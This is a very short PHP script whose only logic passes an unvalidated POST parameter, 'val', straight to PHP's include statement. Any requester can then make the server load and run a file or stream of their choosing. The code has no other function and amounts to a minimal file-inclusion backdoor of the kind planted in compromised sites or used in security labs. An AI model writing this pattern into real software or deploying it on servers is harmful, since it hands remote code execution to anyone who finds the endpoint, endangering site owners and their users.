<?php
	if(isset($_POST['val']) && !empty($_POST['val'])){
		$val = $_POST['val'];
		return include $val ;
	}else{
	}
?>